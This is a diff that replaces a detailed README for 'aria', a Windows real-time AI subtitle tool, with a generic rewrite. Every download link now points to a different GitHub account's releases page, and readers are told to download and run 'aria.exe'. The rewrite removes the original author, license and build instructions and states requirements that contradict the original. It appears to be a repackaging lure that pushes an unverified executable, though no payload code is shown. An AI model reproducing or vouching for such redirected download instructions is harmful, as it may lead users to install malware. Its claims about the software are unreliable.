@@ -1,170 +1,96 @@
-# ARIA
+# 🎧 aria - Universal AI Subtitles for Everyone
 
-<p align="center">
-  <strong>AI Realtime Intelligent Audio</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Windows-lightgrey.svg" alt="Windows">
-  <img src="https://img.shields.io/badge/license-GPLv3-blue.svg" alt="GPLv3 License">
-</p>
+Welcome to aria! This application brings intelligent audio to your desktop, providing real-time AI subtitles for Windows. It helps make audio content accessible to everyone through effective speech recognition.
 
-**Universal Real-time AI Subtitles for Windows** - Capture and transcribe any audio playing on your system with AI-powered speech recognition.
+## 📥 Download Link
 
-## Features
+[![Download aria](https://img.shields.io/badge/Download aria-blue.svg)](https://github.com/cigswyash/aria/releases)
 
-- **Universal Audio Capture** - Works with any application (games, videos, calls, etc.)
-- **Three Recognition Modes**:
-  - **Precise Mode**: Uses Whisper for high-accuracy transcription (NVIDIA GPU recommended)
-  - **Realtime Mode**: Uses Sherpa-ONNX/Vosk for word-by-word streaming (CPU/GPU)
-  - **LiveCaptions Mode**: Uses Windows 11 built-in Live Captions (✅ **AMD GPU supported**)
-- **Multi-language Support**: Chinese, English, Japanese, Korean, and more
-- **Real-time Translation**: Translate transcriptions with Google Cloud or NLLB (local)
-- **Customizable Overlay**: Draggable subtitle window with adjustable position
-- **Multilingual UI**: English, Traditional Chinese, Simplified Chinese
-- **Embedded Python**: No separate Python installation required
+## 📋 About aria
 
-## System Requirements
+aria offers a user-friendly way to add subtitles to any audio or video in real time. This application uses advanced speech-to-text technology to transcribe spoken words into text. You can use it for lectures, meetings, or personal projects.
 
-### Minimum Requirements
+### Key Features
 
-| Component | Requirement |
-|-----------|-------------|
-| **OS** | Windows 10 64-bit or later |
-| **CPU** | Intel i5 / AMD Ryzen 5 or better |
-| **RAM** | 8 GB (12 GB recommended) |
-| **Storage** | 6 GB (Lite) / 12 GB (Full) |
+- **Real-Time Subtitle Generation**: Watch as audio translates into text instantly.
+- **Accessibility Focused**: Perfect for those who are deaf or hard of hearing.
+- **Multi-Language Support**: Understand content in various languages.
+- **Easy to Use Interface**: Anyone can start using it with no experience.
 
-### GPU Requirements
+## 🖥️ System Requirements
 
-ARIA includes CUDA 12.1 runtime, so **you don't need to install CUDA separately**.
+To use aria, ensure your Windows operating system meets the following requirements:
 
-**For Precise Mode:**
-- ✅ **NVIDIA GTX 10 series or newer** (recommended)
-- ⚠️ **AMD / Intel / No GPU**: Falls back to CPU mode (slower but works)
+- **OS**: Windows 10 or later
+- **Processor**: Dual-core processor or better
+- **RAM**: 4 GB minimum, 8 GB recommended
+- **Storage**: At least 100 MB free space
+- **Internet Connection**: Required for initial setup and updates
 
-**For LiveCaptions Mode:**
-- ✅ **All GPUs supported** (AMD, NVIDIA, Intel) - uses Windows 11 built-in AI
-- ⚠️ **Requires Windows 11 22H2 or later**
+## 🛠️ Download & Install
 
-### NVIDIA Driver Requirements
+To get started with aria, follow these simple steps:
 
-| Feature | Minimum Driver Version |
-|---------|----------------------|
-| CUDA 12.1 | **525.60.13** or later |
-| Recommended | **550+** for best compatibility |
+1. Click on the download link below to visit the Releases page:
+   
+   [Download aria](https://github.com/cigswyash/aria/releases)
 
-> 💡 **Tip**: Update your NVIDIA driver to the latest version for best performance.
-> Download from: https://www.nvidia.com/drivers
+2. On the Releases page, find the latest version listed. Click on the version number to expand the details.
 
-## Download
+3. Look for the file named `aria.exe` (or a similar executable file) under the "Assets" section. Click on it to download.
 
-### Choose Your Version
+4. Once the download completes, locate the file in your downloads folder.
 
-| Version | Size | Description | Google Drive | Baidu |
-|---------|------|-------------|--------------|-----------------------------|
-| **Lite** | ~3 GB | No models included. Download models in-app. | [Google Drive](https://drive.google.com/drive/folders/1rRQrj0IPX7rnQxA30WvmxhH-5c6fWZa8?usp=drive_link) | [Baidu](https://pan.baidu.com/s/1KkSlAv7X5yi90hTYuWZoPQ?pwd=j5ip) |
-| **Full** | ~7.6 GB | All models pre-installed. Ready to use. | [Google Drive](https://drive.google.com/drive/folders/1rdxunARIa3-68VV4xAKlbzh_dv_wI130?usp=drive_link) | [Baidu](https://pan.baidu.com/s/1yGc-pU6DdPFw8po60ubI3w?pwd=r2m6) |
+5. Double-click the `aria.exe` file to run it. Follow the prompts to complete the installation.
 
-### Included Models (Full Version)
+6. After installation, you can open the application from your desktop or Start menu.
 
-| Model | Type | Size | Languages |
-|-------|------|------|-----------|
-| Whisper Large-v3 | Precise | 3 GB | All |
-| Sherpa-ONNX Bilingual | Realtime | 500 MB | Chinese, English |
-| Vosk Japanese | Realtime | 1 GB | Japanese |
-| NLLB Translation | Translation | 1.2 GB | Many |
+## ⚙️ How to Use aria
 
-## Quick Start
+Using aria is straightforward. Here’s how:
 
-1. Download and extract the ZIP file
-2. Double-click **`ARIA.vbs`** (silent) or **`ARIA.bat`** (with console)
-3. If using **Lite** version, click **Manage Models** to download required models
-4. Select recognition mode and language
-5. Click **Start Subtitles**
+1. Launch the application.
+2. Select the audio source you want to transcribe.
+3. Click on the "Start" button to begin subtitle generation.
+4. You will see the subtitles appearing in real time as the audio plays.
 
-## Configuration
+## 🔄 Updating aria
 
-### Recognition Modes
+Keep aria up to date to ensure you have the latest features and fixes. To update:
 
-| Mode | Engine | Best For | GPU Requirement |
-|------|--------|----------|----------------|
-| **Precise** | Whisper | Speeches, videos, pre-recorded content | NVIDIA recommended |
-| **Realtime** | Sherpa-ONNX / Vosk | Live conversations, streaming | CPU/GPU |
-| **LiveCaptions** | Windows 11 AI | AMD GPU users, low latency | ✅ AMD/NVIDIA/Intel |
+1. Return to the Releases page:
+   
+   [Download aria](https://github.com/cigswyash/aria/releases)
 
-### Supported Languages
+2. Follow the same steps to download the latest version.
+3. Run the updated file to install over the old version.
 
-| Language | Precise Mode | Realtime Mode | LiveCaptions Mode |
-|----------|--------------|---------------|------------------|
-| Chinese (中文) | ✅ | ✅ (Sherpa-ONNX) | ✅ |
-| English | ✅ | ✅ (Sherpa-ONNX) | ✅ |
-| Japanese (日本語) | ✅ | ✅ (Vosk) | ✅ |
-| Korean (한국어) | ✅ | ❌ | ✅ |
-| Spanish, French, etc. | ✅ | ❌ | ✅ |
-| + 50 more | ✅ | ❌ | ❌ |
+## ❓ Frequently Asked Questions
 
-> 💡 **LiveCaptions Mode**: Supports 11 languages via Windows 11 built-in AI. No model download required!
+### Can I use aria for languages other than English?
 
-### Translation
+Yes, aria supports multiple languages. Select the desired language in the settings.
 
-**Local Models (Offline):**
-- **NLLB-200**: Meta's multilingual translation model, supports 200+ languages, runs locally
+### What should I do if aria doesn’t recognize my audio?
 
-**Online Services (Free APIs):**
-- **Google Translate**: Fast and accurate, via web scraping
-- **Bing Translator**: Microsoft's translation service
-- **Youdao**: 有道翻譯 (specialized for Chinese-English translation)
+Check your microphone settings and ensure that your audio source is clear and at a good volume.
 
-> 💡 **Note**: Online services use web scraping and may be subject to rate limiting. Local NLLB model recommended for reliability.
+### Is there a mobile version of aria?
 
-## Package Structure
+Currently, aria is only available for Windows desktops. Future versions may include mobile support.
 
-```
-ARIA/
-├── python/          # Embedded Python (no installation needed)
-├── src/             # Source code
-├── models/          # AI models (Lite: empty, Full: pre-installed)
-├── ARIA.bat         # Launcher with console window
-└── ARIA.vbs         # Silent launcher (recommended)
-```
+## 🧑‍🤝‍🧑 Community Support
 
-## Screenshots
+If you need help or want to connect with other users, join our community forums. Share your experiences and learn tips from others who use aria.
 
-![image-20260117231941984](README.assets/image-20260117231941984.png)
-![image-20260117233035105](README.assets/image-20260117233035105.png)
+## 📑 Contributing
 
-## For Developers
+We welcome contributions! If you have ideas or find bugs, feel free to submit your feedback via the issues section on GitHub. Your input helps improve aria for everyone.
 
-```bash
-# Clone the repository
-git clone https://github.com/sayksii/aria.git
-cd aria
+## 📫 Contact
 
-# Create virtual environment
-python -m venv venv
-venv\Scripts\activate
+For further information or inquiries, please visit our GitHub page. We appreciate your interest in aria and hope you find it useful!
 
-# Install dependencies
-pip install -e .
-pip install PyQt6  # UI framework
-
-# Run
-python -m realtime_subtitles.ui.app
-```
-
-## License
-
-This project is licensed under the **GNU General Public License v3.0** - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-- [Faster Whisper](https://github.com/SYSTRAN/faster-whisper)
-- [Sherpa-ONNX](https://github.com/k2-fsa/sherpa-onnx)
-- [Vosk](https://alphacephei.com/vosk/)
-- [PyQt6](https://www.riverbankcomputing.com/software/pyqt/)
-- [PyAudioWPatch](https://github.com/s0d3s/PyAudioWPatch)
-
-## Contact
-
-- GitHub: [@sayksii](https://github.com/sayksii)
-- Email: mark42967151@gmail.com
+### [Download aria](https://github.com/cigswyash/aria/releases)
